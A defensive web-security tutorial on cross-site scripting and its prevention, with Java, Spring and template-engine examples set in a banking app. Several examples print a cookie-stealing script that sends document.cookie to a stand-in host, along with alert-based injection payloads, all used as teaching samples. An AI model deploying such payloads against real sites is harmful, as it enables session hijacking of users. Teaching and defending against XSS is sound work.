### What is XSS?

Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious JavaScript into a web page. When other users load that page, their browsers execute the injected script in the context of the trusted site. The browser has no way to know the script is not legitimate.

The attacker can steal session cookies, tokens, perform actions as the victim, redirect the user, or deface the page.

```html
<!-- Stored XSS: attacker saves this as a payment note -->
<script>fetch('https://evil.com/?c='+document.cookie)</script>

<!-- When Priya views the payment note, her browser runs the script -->
<!-- Her session cookie is sent to the attacker's server -->
```

### What are the types of XSS?

There are three main types:

- **Stored XSS**: the payload is saved in the database (like a payment note, comment, or profile name) and served to every viewer.
- **Reflected XSS**: the payload is in the URL or request parameter and is echoed back in the response without sanitization.
- **DOM-based XSS**: client-side JavaScript writes untrusted data into the page (like `innerHTML = location.hash`).

```java
package com.bank.vulnerability;

// Stored XSS example: payment note saved in DB
public class StoredXssDemo {
    // Attacker saves: <script>fetch('https://evil.com/?c='+document.cookie)</script>
    // as a payment note. Every time a user views the note,
    // their browser executes the script.
}

// Reflected XSS example: search parameter echoed in page
// URL: /search?q=<script>alert('xss')</script>
// Server renders: "Results for: <script>alert('xss')</script>"
// Browser executes the script.

// DOM-based XSS example:
// JavaScript: document.getElementById('output').innerHTML = location.hash;
// URL: /page#<img src=x onerror=alert('xss')>
// Browser executes the handler.
```

### How does output encoding prevent XSS?

The primary defense is contextual output encoding: when placing untrusted data into HTML, encode the special characters so the browser renders them as visible text rather than executing them as code.

The characters `<`, `>`, `&`, `"`, and `'` are replaced with their HTML entity equivalents.

```java
package com.bank.security;

public class HtmlEncoder {

    public static String encode(String input) {
        if (input == null) return "";
        return input
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#x27;");
    }

    public static void main(String[] args) {
        String malicious = "<script>fetch('https://evil.com/?c='+document.cookie)</script>";
        String safe = encode(malicious);
        System.out.println("Encoded: " + safe);
        // Browser shows the text literally, does not execute it
    }
}
```

```text
Encoded: &lt;script&gt;fetch(&#x27;https://evil.com/?c=&#x27;+document.cookie)&lt;/script&gt;
Browser renders: <script>fetch('https://evil.com/?c='+document.cookie)</script> (as visible text)
Nothing executes.
```

### How do template engines help?

Modern template engines escape by default. Thymeleaf's `th:text` and React's JSX expressions automatically encode output. The danger is explicitly unescaped output like Thymeleaf's `th:utext` or React's `dangerouslySetInnerHTML`.

```html
<!-- Thymeleaf: safe by default -->
<p th:text="${paymentNote}">Note</p>
<!-- Output: &lt;script&gt;... (escaped, safe) -->

<!-- Thymeleaf: DANGEROUS, unescaped -->
<p th:utext="${paymentNote}">Note</p>
<!-- Output: <script>... (not escaped, XSS!) -->
```

```java
// React JSX: safe by default
// <p>{paymentNote}</p>  // automatically escaped

// React DANGEROUS:
// <p dangerouslySetInnerHTML={{__html: paymentNote}} />  // XSS risk!
```

### What is Content Security Policy (CSP)?

CSP is an HTTP response header that tells the browser which sources are allowed for scripts, styles, images, and other resources. It blocks inline scripts and scripts from untrusted origins.

```java
package com.bank.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.header.writers.ContentSecurityPolicyHeaderWriter;

@Configuration
public class CspConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                .policyDirectives("default-src 'self'; "
                    + "script-src 'self'; "
                    + "style-src 'self'; "
                    + "img-src 'self' data:;")
            )
        );
        return http.build();
    }
}
```

```text
Response header:
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'

Result: browser blocks inline <script> tags and scripts from other domains.
Even if XSS injects a script, CSP prevents execution.
```

### How do HttpOnly cookies help?

Marking session cookies `HttpOnly` means `document.cookie` cannot read them. Even if XSS injection succeeds, the attacker cannot steal the session token.

```java
// Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Strict

// XSS script tries:
// document.cookie --> "" (HttpOnly cookie is invisible to JavaScript)
// The attacker cannot steal the session token.
```

### What about rich HTML that must be allowed?

For content that legitimately contains HTML (like a rich text editor), use an allowlist sanitizer that strips dangerous tags and attributes while keeping safe ones.

```java
package com.bank.security;

import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;

public class HtmlSanitizer {

    private static final PolicyFactory POLICY = Sanitizers.FORMATTING
        .and(Sanitizers.LINKS)
        .and(Sanitizers.BLOCKS);

    public static String sanitize(String untrustedHtml) {
        return POLICY.sanitize(untrustedHtml);
    }

    public static void main(String[] args) {
        String input = "<b>Payment note</b><script>alert('xss')</script>";
        String safe = sanitize(input);
        System.out.println("Sanitized: " + safe);
    }
}
```

```text
Sanitized: <b>Payment note</b>
// <script> tag stripped, <b> tag preserved
```

### What are common mistakes?

The most common mistake is trusting input validation alone. The same value can be safe in one context and dangerous in another. Output encoding is the reliable foundation.

```java
// WRONG: relying only on input validation
if (!input.contains("<script>")) { /* safe? NO! */ }
// Attacker uses: <img src=x onerror=alert('xss')> -- no <script> tag!

// CORRECT: output encoding regardless of input validation
String safe = HtmlEncoder.encode(input);
// All special characters escaped, any payload neutralized
```

### What should a senior engineer know?

Senior engineers know that encoding must match the output context: HTML body, HTML attribute, URL, JavaScript, and CSS each require different escaping rules. Using HTML encoding inside a JavaScript context still allows injection.

Senior engineers also implement defense in depth: output encoding as the primary defense, CSP as the safety net, HttpOnly cookies to protect tokens, and Subresource Integrity (SRI) to detect tampered CDN scripts.
